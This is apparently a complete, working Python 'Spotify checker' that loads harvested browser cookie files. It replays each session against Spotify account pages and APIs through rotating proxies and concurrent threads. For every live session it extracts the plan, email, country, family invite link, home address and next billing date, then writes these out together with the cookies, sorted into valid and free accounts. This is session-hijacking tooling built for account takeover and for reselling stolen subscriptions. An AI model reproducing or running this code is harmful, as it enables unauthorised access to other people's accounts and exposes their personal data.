#!/usr/bin/env python3

import sys
import os
import copy
import json
import time
import random
import re
import string
import threading
import queue
import base64
from datetime import datetime
import tkinter as tk
from tkinter import filedialog

import requests

try:
    import yaml
except ImportError:
    yaml = None

if os.name == 'nt':
    os.system('')

CHANNEL_NAME = base64.b64decode("U3Byb2plY3RjaGFubmVs").decode("utf-8")

DEFAULT_CONFIG = {
    "txt_fields": {
        "plan": True,
        "email": True,
        "country": True,
        "owner": True,
        "free_slots": True,
        "invite_link": True,
        "address": True
    },
    "retries": {
        "error_proxy_attempts": 3
    }
}

BANNER_ART = """
        ██████████████████████████████████████████████████████████████████████████████████
        █─▄▄▄▄█▄─▄▄─█─▄▄─█─▄─▄─█▄─▄█▄─▄▄─█▄─█─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
        █▄▄▄▄─██─▄▄▄█─██─███─████─███─▄████▄─▄████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
        ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀  
"""

RESULTS_DIR = os.path.join("results", "SPOTIFY")
VALID_DIR = os.path.join(RESULTS_DIR, "valid")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(VALID_DIR, exist_ok=True)

FREE_FILE = os.path.join(RESULTS_DIR, "free.txt")

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm", "xterm-256color", "screen")

if _USE_COLOR:
    RST    = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    GREEN  = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED    = "\033[38;5;203m"
    YEL    = "\033[38;5;220m"
    CYAN   = "\033[38;5;51m"
    MAG    = "\033[38;5;213m"
    GREY   = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""


def out_c(t, color):
    return f"{color}{t}{RST}"


def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        print("\n" * 3)


def print_banner():
    clear_screen()
    print(out_c(BANNER_ART, GREEN))
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> SPOTIFY CHECKER", LGREEN))
    print(out_c(f" Channel: {CHANNEL_NAME}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")


def ensure_proxy_file(proxy_file="proxy.txt"):
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# ip:port or ip:port:user:pass\n")


def sanitize_filename_part(value, fallback="UNKNOWN"):
    cleaned = str(value or "").strip()
    safe = re.sub(r'[<>:"/\\|?*\s]+', "_", cleaned).strip("._-")
    return safe or fallback


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")
    with open(path, "wb") as out_f:
        out_f.write(data)
        out_f.flush()


def build_valid_filepath(plan_key, country, email, random_suffix):
    safe_plan = sanitize_filename_part(plan_key, "PLAN")
    safe_country = sanitize_filename_part(country, "UNKNOWN")
    safe_email = sanitize_filename_part(email.split("@")[0] if "@" in str(email) else email, "ACCT")
    base_name = f"{safe_plan}_{safe_country}_{safe_email}_{random_suffix}.txt"
    candidate = os.path.join(VALID_DIR, base_name)
    counter = 1
    while os.path.exists(candidate):
        candidate = os.path.join(VALID_DIR, f"{safe_plan}_{safe_country}_{safe_email}_{random_suffix}_{counter}.txt")
        counter += 1
    return candidate


class TopStatus:
    NROWS = 5
    W     = 64
    BATCH_SIZE = 5

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.free = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.pending_lines = []
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY), (f"{self.checked}/{self.total}", LGREEN),
            ("   valid ", GREY), (str(self.valid), GREEN),
            ("   free ", GREY), (str(self.free), CYAN),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col   = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("bad ", GREY), (str(self.bad), RED),
            ("   err ", GREY), (str(self.err), YEL),
            ("   speed ", GREY), (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY), (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col   = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def _print_batch_unlocked(self, lines):
        if not lines:
            return
        for line in lines:
            print(line)
        self.emitted += len(lines)
        self._redraw()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "VALID": self.valid += 1
            elif label == "FREE": self.free += 1
            elif label == "BAD": self.bad += 1
            elif label == "ERR": self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            if not self.enabled:
                print(line)
                return
            self.pending_lines.append(line)
            if len(self.pending_lines) >= self.BATCH_SIZE:
                batch = self.pending_lines[:self.BATCH_SIZE]
                self.pending_lines = self.pending_lines[self.BATCH_SIZE:]
                self._print_batch_unlocked(batch)

    def flush(self):
        with self.lock:
            if self.pending_lines:
                batch = self.pending_lines[:]
                self.pending_lines.clear()
                self._print_batch_unlocked(batch)
            else:
                self._redraw()


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith('[') and host.endswith(']'):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {
        "http": proxy_url,
        "https": proxy_url
    }


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    line = re.sub(r'^([a-zA-Z][a-zA-Z0-9+.-]*):/+', r'\1://', line)
    line = re.sub(r'\s+', ' ', line).strip()

    url_like = re.match(
        r'^(?P<scheme>https?|socks5h?|socks4a?)://'
        r'(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?'
        r'(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$',
        line,
        flags=re.IGNORECASE
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(
            data["scheme"].lower(),
            data["host"],
            data["port"],
            data.get("user"),
            data.get("password")
        )

    userpass_hostport = re.match(
        r'^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$',
        line
    )
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport_userpass = re.match(
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$',
        line
    )
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport = re.match(r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$', line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])

    four_part = line.split(':')
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c, d, a, b)

    split_patterns = [
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$'
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    return None


def load_proxies(proxy_file="proxy.txt"):
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")


def infer_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    name = plan_name.strip().lower()
    if "free" in name:
        return "free"
    if "family" in name and "basic" in name:
        return "family_basic"
    if "family" in name:
        return "family_premium_v2"
    if "duo" in name:
        return "duo_premium"
    if "student" in name and "hulu" in name:
        return "student_premium_hulu"
    if "student" in name:
        return "student_premium"
    if "mini" in name:
        return "premium_mini"
    if "basic" in name and "premium" in name:
        return "basic_premium"
    if "premium" in name:
        return "premium"
    return "unknown"


def _extract_first(text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, text, flags)
        if match:
            return match.group(1)
    return None


def _to_int(value):
    try:
        return int(str(value).strip())
    except:
        return None


def parse_next_payment_date_from_html(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    candidate = _extract_first(
        combined,
        [
            r'next bill[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next bill[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})'
        ],
        flags=re.IGNORECASE
    )
    if not candidate:
        return None

    candidate = candidate.strip()
    for fmt in ("%m/%d/%Y", "%B %d, %Y", "%b %d, %Y"):
        try:
            return datetime.strptime(candidate, fmt).date()
        except:
            pass

    if re.match(r"^\d{1,2}/\d{1,2}/\d{4}$", candidate):
        try:
            part_a, part_b, year = [int(x) for x in candidate.split("/")]
            month, day = part_a, part_b
            if part_a > 12 and part_b <= 12:
                month, day = part_b, part_a
            return datetime(year, month, day).date()
        except:
            return None
    return None


def is_external_billing_managed(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    return re.search(
        r'managed\s+through\s+(google\s+play|apple|app\s*store|itunes)',
        combined,
        flags=re.IGNORECASE
    ) is not None


def parse_overview_data(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"

    logged_in = (
        ('loggedIn\\":true' in source) or
        ('"loggedIn":true' in normalized) or
        ('"isLoggedInUser":true' in normalized)
    )

    plan_name = _extract_first(
        combined,
        [
            r'planName\\":\\"([^"]+)',
            r'"planName":"([^"]+)"',
            r'data-encore-id="text">([^<]+)<'
        ],
        flags=re.IGNORECASE
    )
    plan_key = infer_plan_key(plan_name or "")

    country = _extract_first(
        combined,
        [
            r'country\\":\\"([A-Za-z]{2})',
            r'"country":"([A-Za-z]{2})"',
            r'countryCode\\":\\"([A-Za-z]{2})',
            r'"countryCode":"([A-Za-z]{2})"'
        ]
    )
    if country:
        country = country.upper()

    is_master_match = _extract_first(
        combined,
        [r'isMaster\\":(true|false)', r'"isMaster":(true|false)'],
        flags=re.IGNORECASE
    )
    is_sub_account_match = _extract_first(
        combined,
        [r'isSubAccount\\":(true|false)', r'"isSubAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    is_child_account_match = _extract_first(
        combined,
        [r'isChildAccount\\":(true|false)', r'"isChildAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    recurring_match = _extract_first(
        combined,
        [r'isRecurring\\":(true|false)', r'"isRecurring":(true|false)'],
        flags=re.IGNORECASE
    )
    trial_match = _extract_first(
        combined,
        [r'isTrialUser\\":(true|false)', r'"isTrialUser":(true|false)'],
        flags=re.IGNORECASE
    )
    email = _extract_first(
        combined,
        [r'email\\":\\"([^"]+)', r'"email":"([^"]+)"'],
        flags=re.IGNORECASE
    )
    invite_link = _extract_first(
        combined,
        [
            r'inviteLink\\":\\"([^"]+)',
            r'"inviteLink":"([^"]+)"',
            r'(https://www\.spotify\.com/[^"\s]*family[^"\s]*)'
        ],
        flags=re.IGNORECASE
    )
    address = _extract_first(
        combined,
        [
            r'address\\":\\"([^"]+)',
            r'"address":"([^"]+)"',
            r'streetAddress\\":\\"([^"]+)',
            r'"streetAddress":"([^"]+)"'
        ],
        flags=re.IGNORECASE
    )
    free_slots_direct = _extract_first(
        combined,
        [
            r'freeSlots\\":(\d+)',
            r'"freeSlots":(\d+)',
            r'availableSlots\\":(\d+)',
            r'"availableSlots":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    members_count = _extract_first(
        combined,
        [
            r'membersCount\\":(\d+)',
            r'"membersCount":(\d+)',
            r'memberCount\\":(\d+)',
            r'"memberCount":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    max_members = _extract_first(
        combined,
        [
            r'maxMembers\\":(\d+)',
            r'"maxMembers":(\d+)',
            r'memberLimit\\":(\d+)',
            r'"memberLimit":(\d+)'
        ],
        flags=re.IGNORECASE
    )

    is_sub_account = None
    if is_master_match is not None:
        is_sub_account = (is_master_match.lower() != "true")
    elif is_sub_account_match is not None:
        is_sub_account = (is_sub_account_match.lower() == "true")

    free_slots = _to_int(free_slots_direct)
    if free_slots is None:
        members_count_int = _to_int(members_count)
        max_members_int = _to_int(max_members)
        if members_count_int is not None and max_members_int is not None:
            free_slots = max(max_members_int - members_count_int, 0)

    if invite_link:
        invite_link = invite_link.replace("\\/", "/")

    return {
        "loggedIn": logged_in,
        "currentPlan": plan_key,
        "country": country or "unknown",
        "isRecurring": recurring_match is not None and recurring_match.lower() == "true",
        "isTrialUser": trial_match is not None and trial_match.lower() == "true",
        "isSubAccount": is_sub_account,
        "email": email or "",
        "inviteLink": invite_link or "",
        "address": address or "",
        "freeSlots": free_slots,
        "isChildAccount": is_child_account_match is not None and is_child_account_match.lower() == "true"
    }


def enrich_family_data_from_home_api(data, family_json):
    if not isinstance(family_json, dict):
        return data

    members = family_json.get("members")
    if not isinstance(members, list):
        members = []
    access_control = family_json.get("accessControl")
    if not isinstance(access_control, dict):
        access_control = {}
    features = family_json.get("features")
    if not isinstance(features, list):
        features = []

    logged_member = None
    for member in members:
        if isinstance(member, dict) and member.get("isLoggedInUser") is True:
            logged_member = member
            break

    if logged_member is not None:
        is_master = logged_member.get("isMaster")
        if isinstance(is_master, bool):
            data["isSubAccount"] = (not is_master)
        is_child = logged_member.get("isChildAccount")
        if isinstance(is_child, bool):
            data["isChildAccount"] = is_child

        member_country = logged_member.get("country")
        if (not data.get("country") or str(data.get("country")).lower() == "unknown") and member_country:
            data["country"] = str(member_country).upper()

    max_capacity = _to_int(family_json.get("maxCapacity"))
    if max_capacity is not None:
        free_slots = max(max_capacity - len(members), 0)
        data["freeSlots"] = free_slots
    elif isinstance(access_control.get("planHasFreeSlots"), bool):
        data["freeSlots"] = 1 if access_control.get("planHasFreeSlots") else 0

    family_address = family_json.get("address")
    if family_address:
        data["address"] = str(family_address)

    invite_token = family_json.get("inviteToken")
    if invite_token:
        data["inviteLink"] = f"https://www.spotify.com/family/join/invite/{invite_token}/"

    if data.get("currentPlan") in ("unknown", "free"):
        if "kids" in features or "genAlpha" in features:
            data["currentPlan"] = "family_premium_v2"
        else:
            data["currentPlan"] = "family_basic"

    return data


def get_account_data_from_new_api(session, proxy=None):
    overview_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "X-Requested-With": "XMLHttpRequest"
    }
    overview_urls = [
        "https://www.spotify.com/us/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
        "https://www.spotify.com/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account"
    ]
    overview_resp = None
    last_status_code = None
    for overview_url in overview_urls:
        resp = session.get(overview_url, headers=overview_headers, proxies=proxy, timeout=20)
        last_status_code = resp.status_code
        if resp.status_code in (403, 429):
            return None, resp.status_code
        if resp.status_code == 200:
            overview_resp = resp
            break

    if overview_resp is None:
        return None, last_status_code if last_status_code is not None else 500

    data = parse_overview_data(overview_resp.text)
    if not data.get("loggedIn"):
        return None, 401

    profile_headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Referer": "https://www.spotify.com/account/profile/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
    }
    profile_url = "https://www.spotify.com/api/account-settings/v1/profile"
    profile_resp = session.get(
        profile_url,
        headers=profile_headers,
        proxies=proxy,
        timeout=20,
        allow_redirects=False
    )

    if profile_resp.status_code == 200:
        try:
            profile_json = profile_resp.json()
            profile_section = profile_json.get("profile", {})
            if not isinstance(profile_section, dict):
                profile_section = {}

            profile_country = profile_section.get("country") or profile_json.get("country")
            profile_email = profile_section.get("email") or profile_json.get("email")
            if profile_country:
                data["country"] = str(profile_country).upper()
            if profile_email:
                data["email"] = str(profile_email)
        except:
            pass

    family_home_url = "https://www.spotify.com/api/family/v1/family/home"
    family_resp = session.get(
        family_home_url,
        headers=profile_headers,
        proxies=proxy,
        timeout=20,
        allow_redirects=False
    )
    if family_resp.status_code == 200:
        try:
            family_json = family_resp.json()
            data = enrich_family_data_from_home_api(data, family_json)
        except:
            pass

    manage_url_candidates = [
        "https://www.spotify.com/us/account/subscription/manage/",
        "https://www.spotify.com/account/subscription/manage/"
    ]
    for manage_url in manage_url_candidates:
        try:
            manage_resp = session.get(
                manage_url,
                headers=overview_headers,
                proxies=proxy,
                timeout=20,
                allow_redirects=True
            )
            if manage_resp.status_code == 200 and manage_resp.text:
                if is_external_billing_managed(manage_resp.text):
                    data["autopayStatus"] = "Unknown"
                    data.pop("nextPaymentDate", None)
                    break
                next_payment_date = parse_next_payment_date_from_html(manage_resp.text)
                if next_payment_date is not None:
                    data["isRecurring"] = True
                    data["nextPaymentDate"] = next_payment_date.isoformat()
                    data["autopayStatus"] = "True"
                    break
        except:
            pass

    return data, 200


def format_cookie_file(data, cookie_content, config):
    txt_fields = config.get("txt_fields", {})
    lines = []
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    email = data.get("email", "")
    owner = "True" if data.get("isSubAccount") is False else "False"
    free_slots = data.get("freeSlots")
    invite_link = data.get("inviteLink", "")
    address = data.get("address", "")
    next_payment_iso = data.get("nextPaymentDate", "")
    autopay_status = data.get("autopayStatus", "")
    is_family_or_duo = data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium")
    is_family_owner = data.get("currentPlan") in ("family_premium_v2", "family_basic") and data.get("isSubAccount") is False

    if txt_fields.get("plan", True):
        lines.append(f"Plan: {plan}")
    if txt_fields.get("email", True):
        lines.append(f"Email: {email}")
    if txt_fields.get("country", True):
        lines.append(f"Country: {country}")
    if str(autopay_status).lower() == "unknown":
        lines.append("Autopay: Unknown")
    if str(autopay_status).lower() != "unknown" and data.get("isRecurring", False) and next_payment_iso:
        try:
            payment_date = datetime.strptime(next_payment_iso, "%Y-%m-%d").date()
            days_left = (payment_date - datetime.now().date()).days
            payment_text = f"{days_left} Days | {payment_date.day} {payment_date.strftime('%b %Y')}"
            lines.append(f"Next Payment: {payment_text}")
        except:
            pass
    if txt_fields.get("owner", True) and is_family_or_duo:
        lines.append(f"Owner: {owner}")
    if data.get("isChildAccount") is True:
        lines.append("Child Account: True")
    if txt_fields.get("free_slots", True) and is_family_owner:
        lines.append(f"Free Slots: {free_slots if isinstance(free_slots, int) else 'unknown'}")
    if txt_fields.get("invite_link", True) and is_family_owner and invite_link:
        lines.append(f"Invite link: {invite_link}")
    if txt_fields.get("address", True) and is_family_owner and address:
        lines.append(f"Address: {address}")

    lines.append("")
    lines.append(f"=== Checked by {CHANNEL_NAME} ===")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)


def convert_json_to_netscape(json_data):
    netscape_lines = []
    for cookie in json_data:
        domain = cookie.get('domain', '')
        tail_match = "TRUE" if domain.startswith('.') else "FALSE"
        path = cookie.get('path', '/')
        secure = "TRUE" if cookie.get('secure', False) else "FALSE"
        expires = str(cookie.get('expirationDate', 0))
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        netscape_lines.append(line)
    return '\n'.join(netscape_lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split('\t')
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return '\n'.join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    return cookies


def worker_task(cookie_queue, proxies, status_box, file_locks, seen_emails, dedupe_lock, max_retry_attempts, retryable_status_codes, config):
    while True:
        try:
            cookie_file = cookie_queue.get_nowait()
        except queue.Empty:
            break

        cookie_path = os.path.join("cookies", cookie_file)
        try:
            with open(cookie_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            try:
                cookies_json = json.loads(content)
                netscape_content = convert_json_to_netscape(cookies_json)
                netscape_content = normalize_netscape_cookie_text(netscape_content)
                cookies = cookies_dict_from_netscape(netscape_content)
            except:
                netscape_content = normalize_netscape_cookie_text(content)
                cookies = cookies_dict_from_netscape(netscape_content)

            if not cookies:
                status_box.bump("BAD")
                status_box.emit(f"  [BAD] {cookie_file}", RED)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
                cookie_queue.task_done()
                continue

            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({'Accept-Encoding': 'identity'})
            data = None
            status_code = None

            for attempt in range(max_retry_attempts):
                proxy = random.choice(proxies) if proxies else None
                try:
                    data, status_code = get_account_data_from_new_api(session, proxy)
                    if status_code == 200 and data:
                        attempt_plan = data.get("currentPlan", "unknown")
                        if attempt_plan == "unknown" and attempt < max_retry_attempts - 1:
                            continue
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception:
                    data = None
                    status_code = None
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and data:
                current_plan = data.get("currentPlan", "unknown")
                country = data.get("country", "unknown")
                plan_display_name = plan_name_mapping(current_plan)
                email_val = str(data.get("email", "")).strip()
                email_key = email_val.lower()
                is_duplicate = False
                if email_key:
                    with dedupe_lock:
                        if email_key in seen_emails:
                            is_duplicate = True
                        else:
                            seen_emails.add(email_key)

                if is_duplicate:
                    status_box.bump("BAD")
                    status_box.emit(f"  [DUP] {cookie_file}", YEL)
                elif current_plan == "free":
                    status_box.bump("FREE")
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    line_info = f"{cookie_file} | Plan: FREE | Country: {country}"
                    status_box.emit("  [FREE] " + line_info, CYAN)
                    with file_locks["free"]:
                        with open(FREE_FILE, "a", encoding="utf-8") as out_f:
                            out_f.write(formatted_cookie + "\n" + "="*40 + "\n")
                else:
                    status_box.bump("VALID")
                    formatted_cookie = format_cookie_file(data, netscape_content, config)
                    line_info = f"{cookie_file} | Plan: {plan_display_name} | Country: {country}"
                    status_box.emit("  [VALID] " + line_info, LGREEN)
                    random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
                    valid_path = build_valid_filepath(current_plan, country, email_val, random_suffix)
                    with file_locks["valid"]:
                        write_text_file_safely(valid_path, formatted_cookie)

                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            else:
                status_box.bump("BAD")
                status_box.emit(f"  [FAIL] {cookie_file}", RED)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
        except Exception:
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {cookie_file}", YEL)
            try:
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except:
                pass

        cookie_queue.task_done()


def main():
    print_banner()

    if not os.path.exists("cookies"):
        os.makedirs("cookies", exist_ok=True)

    cookie_files = [name for name in os.listdir("cookies") if name.lower().endswith((".txt", ".json"))]
    if not cookie_files:
        print(out_c("  [!] no cookies in 'cookies/' (.txt / .json).", YEL))
        input(out_c("  [enter] exit...", GREY))
        return

    total_cookies = len(cookie_files)
    print(out_c(f"  [+] {total_cookies} cookies loaded.", GREEN))

    proxy_opt = input(out_c("  [?] proxies [y/N]: ", LGREEN)).strip().lower()
    proxies = []

    if proxy_opt in ('y', 'yes', '1', 's', 'sim'):
        proxy_file = "proxy.txt"
        ensure_proxy_file(proxy_file)
        proxies = load_proxies(proxy_file)
        if proxies:
            print(out_c(f"  [+] {len(proxies)} proxies loaded.", LGREEN))
        else:
            print(out_c("  [!] proxy.txt empty. running direct.", YEL))
    else:
        print(out_c("  [*] direct.", GREY))

    try:
        threads_count = int(input(out_c("  [?] threads [10]: ", LGREEN)).strip() or "10")
        if threads_count < 1:
            threads_count = 10
    except ValueError:
        threads_count = 10

    config = copy.deepcopy(DEFAULT_CONFIG)
    cookie_queue = queue.Queue()
    for cf in cookie_files:
        cookie_queue.put(cf)

    file_locks = {
        "valid": threading.Lock(),
        "free": threading.Lock()
    }

    seen_emails = set()
    dedupe_lock = threading.Lock()
    max_retry_attempts = 3
    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  cookies : {out_c(str(total_cookies), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(threads_count), LGREEN):<34}" + out_c("│", GREY))
    mode = "direct" if not proxies else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status_box = TopStatus(total=total_cookies)
    status_box.draw_initial()

    start_time = time.time()

    threads = []
    for _ in range(min(threads_count, total_cookies)):
        t = threading.Thread(
            target=worker_task,
            args=(cookie_queue, proxies, status_box, file_locks, seen_emails, dedupe_lock, max_retry_attempts, retryable_status_codes, config)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    status_box.flush()
    elapsed = time.time() - start_time

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))

    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))

    boxline(f"   DONE  ·  {elapsed:.1f}s")
    boxline(f"   valid {status_box.valid}  ·  free {status_box.free}", GREY)
    boxline("   valid: results/SPOTIFY/valid/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()


if __name__ == "__main__":
    main()